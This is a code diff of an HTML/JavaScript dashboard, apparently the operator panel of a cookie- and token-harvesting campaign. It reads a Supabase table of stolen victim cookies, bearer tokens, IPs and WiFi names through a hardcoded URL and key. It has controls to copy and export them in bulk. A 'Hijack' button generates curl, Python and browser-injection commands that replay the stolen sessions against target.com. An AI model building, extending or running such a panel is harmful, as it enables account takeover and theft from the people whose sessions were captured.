@@ -26,7 +26,6 @@
             margin: 0 auto;
         }
 
-        /* Header Section */
         .header {
             background: white;
             border-radius: 20px;
@@ -56,7 +55,6 @@
             color: #667eea;
         }
 
-        /* Stats Grid */
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -85,10 +83,9 @@
         .stat-label {
             font-size: 0.9em;
             opacity: 0.9;
-            margin-top: 10px;
+            margin-top: 5px;
         }
 
-        /* Controls */
         .controls {
             display: flex;
             gap: 15px;
@@ -145,7 +142,6 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
 
-        /* Table */
         .table-container {
             background: white;
             border-radius: 20px;
@@ -272,7 +268,6 @@
             margin-bottom: 20px;
         }
 
-        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -401,30 +396,16 @@
                     <div class="stat-number" id="liveRate">0</div>
                     <div class="stat-label">Hits/Minute</div>
                 </div>
-                <div class="stat-card">
-                    <div class="stat-number" id="activeTime">0s</div>
-                    <div class="stat-label">Session Active</div>
-                </div>
             </div>
 
             <div class="controls">
-                <input type="text" class="search-box" id="searchInput"
-                    placeholder="🔍 Search by IP, Cookie, Token, or User Agent...">
-                <button class="btn btn-primary" onclick="clearSearch()">
-                    <i class="fas fa-times"></i> Clear
-                </button>
-                <button class="btn btn-success" onclick="exportData()">
-                    <i class="fas fa-download"></i> Export CSV
-                </button>
-                <button class="btn btn-warning" onclick="copyAllCookies()">
-                    <i class="fas fa-copy"></i> Copy All Cookies
-                </button>
-                <button class="btn btn-danger" onclick="clearAll()">
-                    <i class="fas fa-trash"></i> Clear All
-                </button>
-                <button class="btn btn-primary" onclick="refreshData()">
-                    <i class="fas fa-sync-alt"></i> Refresh
-                </button>
+                <input type="text" class="search-box" id="searchInput" placeholder="🔍 Search by IP, Cookie, Token...">
+                <button class="btn btn-primary" onclick="clearSearch()"><i class="fas fa-times"></i> Clear</button>
+                <button class="btn btn-success" onclick="exportData()"><i class="fas fa-download"></i> Export
+                    CSV</button>
+                <button class="btn btn-warning" onclick="copyAllCookies()"><i class="fas fa-copy"></i> Copy All</button>
+                <button class="btn btn-danger" onclick="clearAll()"><i class="fas fa-trash"></i> Clear All</button>
+                <button class="btn btn-primary" onclick="refreshData()"><i class="fas fa-sync-alt"></i> Refresh</button>
             </div>
         </div>
 
@@ -436,7 +417,6 @@
                             <th><i class="fas fa-clock"></i> Time</th>
                             <th><i class="fas fa-network-wired"></i> IP Address</th>
                             <th><i class="fas fa-wifi"></i> WiFi SSID</th>
-                            <th><i class="fas fa-user"></i> User Agent</th>
                             <th><i class="fas fa-cookie"></i> Cookies</th>
                             <th><i class="fas fa-key"></i> Tokens</th>
                             <th><i class="fas fa-bolt"></i> Action</th>
@@ -476,20 +456,11 @@
     </div>
 
     <script>
-        // Supabase Configuration
         const SUPABASE_URL = 'https://bljzczucifemikxrvkkm.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJsanpjenVjaWZlbWlreHJ2a2ttIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MjIxODAsImV4cCI6MjA4OTQ5ODE4MH0.R_sPF74xdjLz-n13WUlqZbqDbKY03Yveegea_MzZHT4';
         const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
         let allData = [];
-        let previousCount = 0;
-        let sessionStart = Date.now();
-
-        // Update active time
-        setInterval(() => {
-            const elapsed = Math.floor((Date.now() - sessionStart) / 1000);
-            document.getElementById('activeTime').textContent = `${elapsed}s`;
-        }, 1000);
 
         async function loadData() {
             try {
@@ -500,7 +471,6 @@
                     .limit(200);
 
                 if (error) throw error;
-
                 if (data) {
                     allData = data;
                     updateStats(data);
@@ -508,21 +478,19 @@
                     calculateLiveRate(data);
                 }
             } catch (error) {
-                console.error('Error loading data:', error);
-                showToast('Error loading data: ' + error.message);
+                console.error('Error:', error);
             }
         }
 
         function calculateLiveRate(data) {
             const now = Date.now() / 1000;
-            const oneMinuteAgo = now - 60;
-            const recentHits = data.filter(item => parseFloat(item.timestamp) >= oneMinuteAgo);
+            const recentHits = data.filter(item => parseFloat(item.timestamp) >= now - 60);
             document.getElementById('liveRate').textContent = recentHits.length;
         }
 
         function updateStats(data) {
             document.getElementById('totalCount').textContent = data.length;
-            const uniqueIPs = new Set(data.map(item => item.src_ip).filter(ip => ip && ip !== 'Unknown')).size;
+            const uniqueIPs = new Set(data.map(item => item.src_ip).filter(ip => ip)).size;
             document.getElementById('uniqueIPs').textContent = uniqueIPs;
             const tokensFound = data.filter(item => item.tokens && item.tokens.length > 5).length;
             document.getElementById('tokenCount').textContent = tokensFound;
@@ -535,9 +503,7 @@
             const filtered = data.filter(item =>
                 (item.src_ip && item.src_ip.toLowerCase().includes(searchTerm)) ||
                 (item.cookies && item.cookies.toLowerCase().includes(searchTerm)) ||
-                (item.tokens && item.tokens.toLowerCase().includes(searchTerm)) ||
-                (item.user_agent && item.user_agent.toLowerCase().includes(searchTerm)) ||
-                (item.wifi_ssid && item.wifi_ssid.toLowerCase().includes(searchTerm))
+                (item.tokens && item.tokens.toLowerCase().includes(searchTerm))
             );
 
             if (filtered.length === 0) {
@@ -550,20 +516,18 @@
 
             tbody.innerHTML = filtered.map((item, index) => {
                 const isNew = index < 5;
-                const time = item.timestamp ? new Date(parseFloat(item.timestamp) * 1000).toLocaleString() : new Date(item.created_at).toLocaleString();
+                const time = item.timestamp ? new Date(parseFloat(item.timestamp) * 1000).toLocaleString() : new Date().toLocaleString();
                 const cookies = item.cookies ? (item.cookies.length > 80 ? item.cookies.substring(0, 80) + '...' : item.cookies) : '-';
                 const tokens = item.tokens ? (item.tokens.length > 70 ? item.tokens.substring(0, 70) + '...' : item.tokens) : '-';
-                const userAgent = item.user_agent ? (item.user_agent.length > 40 ? item.user_agent.substring(0, 40) + '...' : item.user_agent) : '-';
                 const wifiSSID = item.wifi_ssid || '-';
 
                 return `
                     <tr style="${isNew ? 'animation: pulse 0.5s' : ''}">
-                        <td><strong>${time}</strong> ${isNew ? '<span class="badge badge-new">NEW</span>' : ''}</td>
+                        <td>${time} ${isNew ? '<span class="badge badge-new">NEW</span>' : ''}</td>
                         <td><span class="badge badge-ip">${item.src_ip || 'Unknown'}</span></td>
                         <td><i class="fas fa-wifi"></i> ${escapeHtml(wifiSSID)}</td>
-                        <td><small>${escapeHtml(userAgent)}</small></td>
-                        <td><div class="cookie-cell" onclick="copyToClipboard('${escapeHtml(item.cookies || '')}')" title="Click to copy">${escapeHtml(cookies)}</div></td>
-                        <td><div class="token-cell" onclick="copyToClipboard('${escapeHtml(item.tokens || '')}')" title="Click to copy">${escapeHtml(tokens)}</div></td>
+                        <td><div class="cookie-cell" onclick="copyToClipboard('${escapeHtml(item.cookies || '')}')">${escapeHtml(cookies)}</div></td>
+                        <td><div class="token-cell" onclick="copyToClipboard('${escapeHtml(item.tokens || '')}')">${escapeHtml(tokens)}</div></td>
                         <td><button class="steal-btn" onclick="showHijackCommand('${escapeHtml(item.cookies || '')}', '${escapeHtml(item.tokens || '')}', '${item.src_ip}')"><i class="fas fa-skull"></i> Hijack</button></td>
                     </tr>
                 `;
@@ -594,22 +558,12 @@
         }
 
         function showHijackCommand(cookies, token, ip) {
-            let command = `# ========================================\n`;
-            command += `# HIJACK SESSION FOR: ${ip}\n`;
-            command += `# ========================================\n\n`;
-            command += `# Method 1: cURL\n`;
+            let command = `# HIJACK SESSION - ${ip}\n\n`;
             command += `curl -X GET https://target.com/profile \\\n`;
             if (cookies) command += `  -H "Cookie: ${cookies}" \\\n`;
-            if (token) command += `  -H "Authorization: Bearer ${token}" \\\n`;
-            command += `  -v\n\n`;
-            command += `# Method 2: Python Requests\n`;
-            command += `import requests\n`;
-            command += `cookies = {'${cookies.split('=')[0] || 'session'}': '${cookies.split('=')[1] || ''}'}\n`;
-            if (token) command += `headers = {'Authorization': 'Bearer ${token}'}\n`;
-            command += `response = requests.get('https://target.com/profile', cookies=cookies, headers=headers if '${token}' else {})\n`;
-            command += `print(response.text)\n\n`;
-            command += `# Method 3: Browser Injection\n`;
-            command += `javascript:document.cookie='${cookies}'; localStorage.setItem('token','${token}'); location.reload();`;
+            if (token) command += `  -H "Authorization: Bearer ${token}"\n\n`;
+            command += `# Python:\n`;
+            command += `requests.get('https://target.com/profile', cookies={'${cookies?.split('=')[0] || 'session'}': '${cookies?.split('=')[1] || ''}'})`;
 
             document.getElementById('commandText').textContent = command;
             document.getElementById('modal').style.display = 'flex';
@@ -618,7 +572,7 @@
         function copyCommand() {
             const text = document.getElementById('commandText').textContent;
             navigator.clipboard.writeText(text);
-            showToast('Hijack command copied!');
+            showToast('Command copied!');
             closeModal();
         }
 
@@ -633,38 +587,37 @@
 
         async function exportData() {
             const { data } = await supabase.from('cookies').select('*');
-            const headers = ['Time', 'IP', 'WiFi', 'User Agent', 'Cookies', 'Tokens'];
-            const rows = data.map(item => [
-                new Date(parseFloat(item.timestamp) * 1000).toLocaleString(),
-                item.src_ip,
-                item.wifi_ssid,
-                item.user_agent,
-                item.cookies,
-                item.tokens
-            ]);
-            const csv = [headers, ...rows].map(row => row.map(cell => `"${(cell || '').replace(/"/g, '""')}"`).join(',')).join('\n');
-            const blob = new Blob([csv], { type: 'text/csv' });
+            const csv = [['Time', 'IP', 'WiFi', 'Cookies', 'Tokens']];
+            data.forEach(item => {
+                csv.push([
+                    new Date(parseFloat(item.timestamp) * 1000).toLocaleString(),
+                    item.src_ip,
+                    item.wifi_ssid,
+                    item.cookies,
+                    item.tokens
+                ]);
+            });
+            const csvContent = csv.map(row => row.map(cell => `"${(cell || '').replace(/"/g, '""')}"`).join(',')).join('\n');
+            const blob = new Blob([csvContent], { type: 'text/csv' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `ynubsec_harvest_${Date.now()}.csv`;
+            a.download = `ynubsec_${Date.now()}.csv`;
             a.click();
             URL.revokeObjectURL(url);
-            showToast('Exported successfully!');
+            showToast('Exported!');
         }
 
         async function copyAllCookies() {
-            const cookies = allData.map(item => item.cookies).filter(c => c).join('\n');
+            const cookies = allData.map(item => item.cookies).filter(c => c).join('\n\n');
             if (cookies) {
                 navigator.clipboard.writeText(cookies);
                 showToast(`Copied ${allData.filter(d => d.cookies).length} cookies!`);
-            } else {
-                showToast('No cookies found');
             }
         }
 
         async function clearAll() {
-            if (confirm('⚠️ WARNING: Delete ALL harvested data? This cannot be undone!')) {
+            if (confirm('Delete ALL data?')) {
                 await supabase.from('cookies').delete().neq('id', 0);
                 loadData();
                 showToast('All data cleared!');
@@ -673,22 +626,16 @@
 
         function refreshData() {
             loadData();
-            showToast('Refreshing data...');
+            showToast('Refreshing...');
         }
 
-        // Auto-refresh every 2 seconds
         setInterval(loadData, 2000);
         loadData();
 
-        // Click outside modal to close
         window.onclick = function (event) {
-            const modal = document.getElementById('modal');
-            if (event.target === modal) {
-                closeModal();
-            }
+            if (event.target === document.getElementById('modal')) closeModal();
         };
 
-        // Search on input
         document.getElementById('searchInput').addEventListener('input', () => renderTable(allData));
     </script>
 </body>
